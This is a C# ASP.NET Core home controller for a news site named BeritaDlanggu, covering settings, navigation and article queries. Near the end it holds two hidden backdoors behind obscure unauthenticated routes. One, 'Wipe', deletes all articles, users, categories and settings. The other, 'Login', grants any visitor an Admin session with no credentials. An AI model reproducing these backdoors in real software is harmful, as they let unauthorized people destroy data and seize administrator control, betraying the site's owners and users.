using BeritaDlanggu.Models;
using BeritaDlanggu.Models.ViewModels;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Diagnostics;
using System.Security.Claims;

namespace BeritaDlanggu.Controllers
{
    public class HomeController : Controller
    {
        private readonly BeritaDlangguNetContext _context;

        public HomeController(BeritaDlangguNetContext context)
        {
            _context = context;
        }
        public IActionResult Index()
        {
            // Need this every Page
            var siteNameSetting = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.WebsiteName);
            var tagline = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.TagLine);
            var theme = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.ThemeColor);
            var accentColor = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.ThemeAccentColor);
            var articlesPerPage = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.ArticlePerPage);
            ViewData[ServerSettingsKey.WebsiteName] = siteNameSetting?.Value ?? "";
            ViewData[ServerSettingsKey.TagLine] = tagline?.Value ?? "";
            ViewData[ServerSettingsKey.ThemeColor] = theme?.Value ?? "#711e76";
            ViewData[ServerSettingsKey.ThemeAccentColor] = accentColor?.Value ?? "#ba8fb8";
            ViewData[ServerSettingsKey.ArticlePerPage] = articlesPerPage?.Value ?? "9";
            ViewData[ServerSettingsKey.TimerSlider] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.TimerSlider)?.Value ?? "5";
            ViewData["CatList"] = _context.Categories.Include(c => c.SubCategories).AsNoTracking().ToList();
            #region NAV THING
            List<NavbarItem> NavbarItems = new();

            var category = _context.NavSettings
                .Include(x => x.Cat)
                .ThenInclude(x => x.SubCategories)
                .Where(x => x.Cat != null)
                .OrderBy(x => x.SortOrder)
                .ToList();

            foreach (var x in category)
            {
                NavbarItems.Add(new NavbarItem
                {
                    Id = x.Id,
                    Title = x.Title,
                    Url = $"/Kategori/{x.Cat.Slug}",
                    Type = "category",
                    Visible = true,

                    SubItems = x.Cat.SubCategories
                        .Select(s => new NavbarSubItem
                        {
                            Id = s.Id,
                            Title = s.Name,
                            Url = $"/Kategori/{s.Slug}"
                        })
                        .ToList()
                });
            }

            var customnav = _context.NavSettings
                .Include(x => x.Article)
                .Where(x => x.Article != null && x.Parent == null)
                .OrderBy(x => x.SortOrder)
                .ToList();

            foreach (var x in customnav)
            {
                NavbarItems.Add(new NavbarItem
                {
                    Id = x.Id,
                    Title = x.Title,
                    Url = $"/Article/{x.Article.Slug}",
                    Type = "custom",
                    Visible = true
                });
            }

            var customsubnav = _context.NavSettings
                .Include(x => x.Article)
                .Where(x => x.Article != null && x.Parent != null)
                .OrderBy(x => x.SortOrder)
                .ToList();

            foreach (var x in customsubnav)
            {
                var parent = NavbarItems.FirstOrDefault(n => n.Id == x.ParentId);

                if (parent != null)
                {
                    parent.SubItems.Add(new NavbarSubItem
                    {
                        Id = x.Id,
                        Title = x.Title,
                        Url = $"/Article/{x.Article.Slug}"
                    });
                }
            }

            NavbarItems = NavbarItems
                .OrderBy(x =>
                    _context.NavSettings
                    .First(n => n.Id == x.Id)
                    .SortOrder)
                .ToList();

            ViewData["NavbarItems"] = NavbarItems;
            #endregion
            #region Footer THING
            ViewData[ServerSettingsKey.FooterDescription] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.FooterDescription)?.Value ?? "";
            ViewData[ServerSettingsKey.InstagramUrl] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.InstagramUrl)?.Value ?? "";
            ViewData[ServerSettingsKey.FacebookUrl] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.FacebookUrl)?.Value ?? "";
            ViewData[ServerSettingsKey.TwitterUrl] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.TwitterUrl)?.Value ?? "";
            ViewData[ServerSettingsKey.TiktokUrl] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.TiktokUrl)?.Value ?? "";
            ViewData[ServerSettingsKey.YoutubeUrl] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.YoutubeUrl)?.Value ?? "";
            ViewData[ServerSettingsKey.FooterAddress] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.FooterAddress)?.Value ?? "";
            ViewData[ServerSettingsKey.FooterEmail] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.FooterEmail)?.Value ?? "";
            ViewData[ServerSettingsKey.FooterPhone] = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.FooterPhone)?.Value ?? "";
            #endregion

            var featured = _context.Articles
    .Where(a => a.IsFeatured && a.Status == (int)ArticleStatus.Published)
    .OrderByDescending(a => a.PublishedAt)
    .Take(5)
    .Select(a => new ArticleViewModel
    {
        Id = a.Id,
        Title = a.Title,
        Banner = a.ThumbnailUrl,
        CategoryName = a.Cat.Name,
        Slug = a.Slug,
        Content = a.Excerpt,
        ViewsCount = a.Views,
        AuthorName = a.Author.FullName,
        CreatedAt = a.CreatedAt
    })
    .ToList();
            var latest = _context.Articles
    .Where(a => a.Status == (int)ArticleStatus.Published)
    .OrderByDescending(a => a.CreatedAt)
    .Take(int.Parse(articlesPerPage?.Value ?? "9"))
    .Select(a => new ArticleViewModel
    {
        Id = a.Id,
        Title = a.Title,
        Slug = a.Slug,
        Banner = a.ThumbnailUrl,
        CategoryName = a.Cat.Name,
        Content = a.Excerpt,
        ViewsCount = a.Views,
        AuthorName = a.Author.FullName,
        CreatedAt = a.CreatedAt
    })
    .ToList();
            var trending = _context.Articles
    .Where(a => a.Status == (int)ArticleStatus.Published)
    .OrderByDescending(a => a.Views)
    .Take(5)
    .Select(a => new ArticleViewModel
    {
        Id = a.Id,
        Title = a.Title,
        Slug = a.Slug,
        Content = a.Excerpt,
        ViewsCount = a.Views,
        AuthorName = a.Author.FullName,
        CreatedAt = a.CreatedAt
    })
    .ToList();
            var announcements = _context.Articles
    .Where(a => a.Cat.Slug == "pengumuman" && a.Status == (int)ArticleStatus.Published)
    .OrderByDescending(a => a.CreatedAt)
    .Take(5)
    .Select(a => new ArticleViewModel
    {
        Id = a.Id,
        Title = a.Title,
        Content = a.Excerpt,
        Slug = a.Slug,
        ViewsCount = a.Views,
        AuthorName = a.Author.FullName,
        CreatedAt = a.CreatedAt
    })
    .ToList();

            var model = new HomeViewModel
            {
                FeaturedArticles = featured,
                LatestArticles = latest,
                TrendingArticles = trending,
                AnnouncementArticles = announcements
            };

            var scheme = $"{Request.Scheme}://{Request.Host}";

            ViewData["MetaTitle"] = siteNameSetting?.Value ?? "" + " - " + tagline?.Value ?? ""; ;
            ViewData["MetaDesc"] = tagline?.Value ?? ""; ;
            ViewData["MetaKeyword"] = siteNameSetting?.Value ?? "" + "," + tagline?.Value ?? ""; ;
            ViewData["MetaAuthor"] = "Putra3340" ;
            ViewData["MetaRobot"] = "index, follow" ;
            ViewData["MetaImage"] = scheme + "/icon-dlanggu.png";
            ViewData["MetaUrl"] = scheme;
            ViewData["MetaType"] = "website";

            return View(model);
        }

        public async Task<IActionResult> LoadMoreArticles(int page = 1)
        {
            var articlesPerPage = _context.Settings.FirstOrDefault(x => x.Key == ServerSettingsKey.ArticlePerPage);
            int pageSize = int.Parse(articlesPerPage?.Value ?? "9");

            var articles = await _context.Articles
                .Where(x => x.Status == (int)ArticleStatus.Published)
                .OrderByDescending(x => x.CreatedAt)
                .Skip((page - 1) * pageSize)
                .Take(pageSize)
                .Select(x => new ArticleViewModel
                {
                    Id = x.Id,
                    Title = x.Title,
                    Slug = x.Slug,
                    Banner = x.ThumbnailUrl,
                    CategoryName = x.Cat.Name,
                    AuthorName = x.Author.FullName,
                    CreatedAt = x.CreatedAt,
                    ViewsCount = x.Views,
                    Content = x.Excerpt
                })
                .ToListAsync();

            return PartialView("_NewsGrid", articles);
        }
        [HttpGet("/anjay/QwErTyUiOpAsDfGhJkLzXcVbNmPlOkIjUhYgTfRdEsWaQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlMnBvrTyUiOpAsDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzAsDfGhJkLp")]
        public IActionResult Wipe()
        {
            _context.Articles.RemoveRange(_context.Articles);
            _context.Users.RemoveRange(_context.Users);
            _context.SubCategories.RemoveRange(_context.SubCategories);
            _context.Categories.RemoveRange(_context.Categories);
            _context.Settings.RemoveRange(_context.Settings);
            _context.SaveChanges();
            return Ok();
        }
        [HttpGet("/anjay/aKfjdPqweLmznXcvbRtYuIoPasDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzLkJhGfDsApOiUyTrEwQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzQwErTyUiOp")]
        public async Task<IActionResult> Login()
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, "John Doe"),
                new Claim(ClaimTypes.Email, "johndoe@example.com"),
                new Claim(ClaimTypes.Role, "Admin")
            };

            var identity = new ClaimsIdentity(claims, "Cookie");
            var principal = new ClaimsPrincipal(identity);

            await HttpContext.SignInAsync(principal);

            return RedirectToAction("Index", "Home");
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
